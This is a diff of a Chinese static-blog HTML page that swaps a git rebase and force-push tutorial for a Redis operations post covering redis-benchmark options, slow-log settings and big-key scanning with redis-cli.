+LRANGE_600 <span style="color:#000;font-weight:bold">(</span>first <span style="color:#099">600</span> elements<span style="color:#000;font-weight:bold">)</span>: 8591.07 requests per second
+MSET <span style="color:#000;font-weight:bold">(</span><span style="color:#099">10</span> keys<span style="color:#000;font-weight:bold">)</span>: 55248.62 requests per second
+</code></pre></td></tr></table>
+</div>
+</div><p>说明：50个连接，10000次请求对应的性能</p>
+<p>参数：</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+<th>默认值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-h</td>
+<td>&lt;hostname&gt;，服务url</td>
+<td>127.0.0.1</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>&lt;port&gt;， 服务端口</td>
+<td>6379</td>
+</tr>
+<tr>
+<td>-s</td>
+<td>&lt;socket&gt;，服务 socket，覆盖host和port</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-a</td>
+<td>&lt;password&gt;，密码</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-c</td>
+<td>&lt;clients&gt;，并发连接数</td>
+<td>50</td>
+</tr>
+<tr>
+<td>-n</td>
+<td>&lt;requests&gt;，指定请求数</td>
+<td>10000</td>
+</tr>
+<tr>
+<td>-d</td>
+<td>&lt;size&gt;，椅子姐的姓氏设定SET/GET值的数据大小</td>
+<td>3</td>
+</tr>
+<tr>
+<td>&ndash;dbnum</td>
+<td>&lt;db&gt;，数据库分片</td>
+<td>0</td>
+</tr>
+<tr>
+<td>-k</td>
+<td>&lt;boolean&gt;，1=keep alive, 0=reconnect</td>
+<td>1</td>
+</tr>
+<tr>
+<td>-r</td>
+<td>&lt;keyspacelen&gt;，SET/GET/INCR 使用随机 key，SADD 使用随机值</td>
+<td></td>
+</tr>
+<tr>
+<td>-P</td>
+<td>通过管道传输&lt;numreq&gt;请求</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-q</td>
+<td>强制退出 redis，仅显示 query/sec 值</td>
+<td>-</td>
+</tr>
+<tr>
+<td>&ndash;csv</td>
+<td>以 CSV 格式输出</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-l</td>
+<td>生成循环，用久执行测试</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-t</td>
+<td>&lt;tests&gt;，仅运行以都好分割的测试命令列表</td>
+<td>-</td>
+</tr>
+<tr>
+<td>-I</td>
+<td>Idle 模式，仅打开 N 个 idle连接并等待</td>
+<td>-</td>
+</tr>
+</tbody>
+</table>
+<h3 id="34-查看慢日志">3.4 查看慢日志</h3>
+<p>查看Redis慢日志之前，你需要设置慢日志的阈值。例如，设置慢日志的阈值为5毫秒，并且保留最近500条慢日志记录：</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#998;font-style:italic"># 命令执行耗时超过 5 毫秒，记录慢日志</span>
+CONFIG SET slowlog-log-slower-than <span style="color:#099">5000</span>
+<span style="color:#998;font-style:italic"># 只保留最近 500 条慢日志</span>
+CONFIG SET slowlog-max-len <span style="color:#099">500</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>设置完成之后，所有执行的命令如果操作耗时超过了5毫秒，都会被Redis记录下来。</p>
+<p>此时，你可以执行以下命令，就可以查询到最近记录的慢日志：</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">127.0.0.1:6379&gt; SLOWLOG get <span style="color:#099">5</span>
+1<span style="color:#000;font-weight:bold">)</span> 1<span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">(</span>integer<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">32693</span>       <span style="color:#998;font-style:italic"># 慢日志ID</span>
+   2<span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">(</span>integer<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">1593763337</span>  <span style="color:#998;font-style:italic"># 执行时间戳</span>
+   3<span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">(</span>integer<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">5299</span>        <span style="color:#998;font-style:italic"># 执行耗时(微秒)</span>
+   4<span style="color:#000;font-weight:bold">)</span> 1<span style="color:#000;font-weight:bold">)</span> <span style="color:#d14">&#34;LRANGE&#34;</span>           <span style="color:#998;font-style:italic"># 具体执行的命令和参数</span>
+      2<span style="color:#000;font-weight:bold">)</span> <span style="color:#d14">&#34;user_list:2000&#34;</span>
+      3<span style="color:#000;font-weight:bold">)</span> <span style="color:#d14">&#34;0&#34;</span>
+      4<span style="color:#000;font-weight:bold">)</span> <span style="color:#d14">&#34;-1&#34;</span>
+2<span style="color:#000;font-weight:bold">)</span> 1<span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">(</span>integer<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">32692</span>
+   2<span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">(</span>integer<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">1593763337</span>
+   3<span style="color:#000;font-weight:bold">)</span> <span style="color:#000;font-weight:bold">(</span>integer<span style="color:#000;font-weight:bold">)</span> <span style="color:#099">5044</span>
+   4<span style="color:#000;font-weight:bold">)</span> 1<span style="color:#000;font-weight:bold">)</span> <span style="color:#d14">&#34;GET&#34;</span>
+      2<span style="color:#000;font-weight:bold">)</span> <span style="color:#d14">&#34;user_info:1000&#34;</span>
+...
+</code></pre></td></tr></table>
+</div>
+</div><p>通过查看慢日志，我们就可以知道在什么时间点，执行了哪些命令比较耗时。</p>
+<h3 id="35-查看bigkey">3.5 查看bigkey</h3>
+<p>Redis提供了扫描bigkey的命令，执行以下命令就可以扫描出，一个实例中bigkey的分布情况，输出结果是以类型维度展示的：</p>
 <div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -334,108 +664,38 @@ git add <span style="color:#000;font-weight:bold">{</span>filePath/fileName<span
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#998;font-style:italic"># 1、修改倒数第1次的commit</span>
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ redis-cli -h 127.0.0.1 -p <span style="color:#099">6379</span> --bigkeys -i 0.01
 
-git rebase -i HEAD~<span style="color:#000;font-weight:bold">{</span>1<span style="color:#000;font-weight:bold">}</span>
+...
+-------- summary -------
 
-<span style="color:#998;font-style:italic"># 2、修改pick为edit，vim界面操作</span>
+Sampled <span style="color:#099">829675</span> keys in the keyspace!
+Total key length in bytes is <span style="color:#099">10059825</span> <span style="color:#000;font-weight:bold">(</span>avg len 12.13<span style="color:#000;font-weight:bold">)</span>
 
-    <span style="color:#998;font-style:italic"># 2.1、回车后进入一个页面，</span>
+Biggest string found <span style="color:#d14">&#39;key:291880&#39;</span> has <span style="color:#099">10</span> bytes
+Biggest   list found <span style="color:#d14">&#39;mylist:004&#39;</span> has <span style="color:#099">40</span> items
+Biggest    <span style="color:#0086b3">set</span> found <span style="color:#d14">&#39;myset:2386&#39;</span> has <span style="color:#099">38</span> members
+Biggest   <span style="color:#0086b3">hash</span> found <span style="color:#d14">&#39;myhash:3574&#39;</span> has <span style="color:#099">37</span> fields
+Biggest   zset found <span style="color:#d14">&#39;myzset:2704&#39;</span> has <span style="color:#099">42</span> members
 
-    <span style="color:#998;font-style:italic"># 2.2、按i进入编辑模式，</span>
-
-    <span style="color:#998;font-style:italic"># 2.3、将要修改的那一条的pick修改成edit，</span>
-
-    <span style="color:#998;font-style:italic"># 2.4、按esc退出编辑模式，输入:wq保存并退出</span>
-   
-<span style="color:#998;font-style:italic"># 3、修改commit注释内容</span>
-
-$ git commit --amend
-
-<span style="color:#998;font-style:italic"># 按i进入编辑模式，修改内容，退出编辑模式，输入:wq保存并退出</span>
-
-<span style="color:#998;font-style:italic"># 4、合并</span>
-$ git rebase --continue
-
-<span style="color:#998;font-style:italic"># 5、强制push</span>
-
-$ git push --force origin <span style="color:#000;font-weight:bold">{</span>master<span style="color:#000;font-weight:bold">}</span>
+<span style="color:#099">36313</span> strings with <span style="color:#099">363130</span> bytes <span style="color:#000;font-weight:bold">(</span>04.38% of keys, avg size 10.00<span style="color:#000;font-weight:bold">)</span>
+<span style="color:#099">787393</span> lists with <span style="color:#099">896540</span> items <span style="color:#000;font-weight:bold">(</span>94.90% of keys, avg size 1.14<span style="color:#000;font-weight:bold">)</span>
+<span style="color:#099">1994</span> sets with <span style="color:#099">40052</span> members <span style="color:#000;font-weight:bold">(</span>00.24% of keys, avg size 20.09<span style="color:#000;font-weight:bold">)</span>
+<span style="color:#099">1990</span> hashs with <span style="color:#099">39632</span> fields <span style="color:#000;font-weight:bold">(</span>00.24% of keys, avg size 19.92<span style="color:#000;font-weight:bold">)</span>
+<span style="color:#099">1985</span> zsets with <span style="color:#099">39750</span> members <span style="color:#000;font-weight:bold">(</span>00.24% of keys, avg size 20.03<span style="color:#000;font-weight:bold">)</span>
 </code></pre></td></tr></table>
 </div>
-</div><p>rebase工具的参数含义：</p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>pick</td>
-<td>保留该commit（缩写:p）</td>
-</tr>
-<tr>
-<td>reword</td>
-<td>保留该commit，但我需要修改该commit的注释（缩写:r）</td>
-</tr>
-<tr>
-<td>edit</td>
-<td>保留该commit, 但我要停下来修改该提交(不仅仅修改注释)（缩写:e）</td>
-</tr>
-<tr>
-<td>squash</td>
-<td>将该commit和前一个commit合并（缩写:s）</td>
-</tr>
-<tr>
-<td>fixup</td>
-<td>将该commit和前一个commit合并，但我不要保留该提交的注释信息（缩写:f）</td>
-</tr>
-<tr>
-<td>exec</td>
-<td>执行shell命令（缩写:x）</td>
-</tr>
-<tr>
-<td>drop</td>
-<td>我要丢弃该commit（缩写:d）</td>
-</tr>
-</tbody>
-</table>
-<h2 id="9状态">9、状态</h2>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git status
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="10差异">10、差异</h2>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git diff <span style="color:#000;font-weight:bold">{</span>commitId1<span style="color:#000;font-weight:bold">}</span> <span style="color:#000;font-weight:bold">{</span>commitId2<span style="color:#000;font-weight:bold">}</span>
-</code></pre></td></tr></table>
-</div>
-</div>
+</div><p>从输出结果我们可以很清晰地看到，每种数据类型所占用的最大内存 / 拥有最多元素的key是哪一个，以及每种数据类型在整个实例中的占比和平均大小 / 元素数量。</p>
+
         </div>
 
         
 <div class="post-archive">
     <ul class="post-copyright">
         <li><strong>原文作者：</strong><a rel="author" href="https://anTtutu.github.io/">Anttu</a></li>
-        <li style="word-break:break-all"><strong>原文链接：</strong><a href="https://anTtutu.github.io/post/2021-10-19-git/">https://anTtutu.github.io/post/2021-10-19-git/</a></li>
+        <li style="word-break:break-all"><strong>原文链接：</strong><a href="https://anTtutu.github.io/post/2022-03-05-redis_safe/">https://anTtutu.github.io/post/2022-03-05-redis_safe/</a></li>
         <li><strong>版权声明：</strong>本作品采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。</li>
     </ul>
 </div>
@@ -449,15 +709,15 @@ $ git push --force origin <span style="color:#000;font-weight:bold">{</span>mast
     <h2>See Also</h2>
     <ul class="listing">
         
-        <li><a href="/post/2021-10-11-caffeine_springcache/">caffeine和springcache</a></li>
+        <li><a href="/post/2022-02-13-logrotate/">logrotate日志切割</a></li>
         
-        <li><a href="/post/2021-10-07-safe_coding_js/">前端编码安全</a></li>
+        <li><a href="/post/2022-02-07-spring_cli/">spring boot cli&amp;spring cloud cli简单介绍</a></li>
         
-        <li><a href="/post/2021-09-30-safe_coding_java/">java编码安全</a></li>
+        <li><a href="/post/2022-02-06-vmstat/">vmstat介绍</a></li>
         
-        <li><a href="/post/2021-09-19-maven_verify/">maven校验依赖包CVE漏洞</a></li>
+        <li><a href="/post/2022-01-26-miner_virus_4/">挖矿病毒4-容器挖矿病毒清理</a></li>
         
-        <li><a href="/post/2021-08-10-jvm_dump_analyse/">jvm的大dump文件分析</a></li>
+        <li><a href="/post/2022-01-24-miner_virus_3/">挖矿病毒3-分析和清理过程</a></li>
         
     </ul>
 </div>
